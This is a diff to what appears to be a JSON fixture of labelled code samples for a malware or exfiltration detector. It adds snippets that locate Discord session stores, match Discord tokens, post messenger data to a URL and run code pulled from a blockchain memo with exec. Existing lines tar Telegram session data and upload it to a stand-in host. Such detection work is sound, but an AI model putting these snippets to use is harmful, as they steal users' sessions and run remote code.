@@ -24,7 +24,9 @@
       ["rs", "let p = home.join(\"AppData/Roaming/Slack/Cookies\");"],
       ["php", "$p = getenv('APPDATA') . '/WhatsApp/Local Storage/leveldb';"],
       ["java", "Path p = Paths.get(steam, \"config\", \"loginusers.vdf\");"],
-      ["sh", "tar czf /tmp/t.tgz \"$HOME/.local/share/TelegramDesktop/tdata\""]
+      ["sh", "tar czf /tmp/t.tgz \"$HOME/.local/share/TelegramDesktop/tdata\""],
+      ["go", "dir := filepath.Join(appdata, \"discordptb\", \"Local Storage\", \"leveldb\")"],
+      ["py", "TOKEN_RE = re.compile(r'[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}')"]
     ]
   },
   "exfiltration/messenger-session-exfiltration": {
@@ -54,6 +56,14 @@
       [
         "sh",
         "curl -F \"file=@$HOME/.local/share/TelegramDesktop/tdata/key_datas\" https://x.example.invalid/u"
+      ],
+      [
+        "rs",
+        "let dir = home.join(\"AppData/Roaming/discord/Local Storage/leveldb\");\nclient.post(url).body(data).send()?;"
+      ],
+      [
+        "java",
+        "Path p = Paths.get(appData, \"discord\", \"Local Storage\", \"leveldb\");\nHttpPost post = new HttpPost(url);"
       ]
     ]
   },
@@ -74,6 +84,10 @@
       [
         "py",
         "w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed1.example.invalid'))\npayload = contract.functions.get().call()\nexec(payload)"
+      ],
+      [
+        "py",
+        "resp = requests.post(RPC, json={'method': 'getSignaturesForAddress', 'params': [OWNER]})\nmemo = decode_memo(resp.json())\nexec(memo)"
       ]
     ]
   },
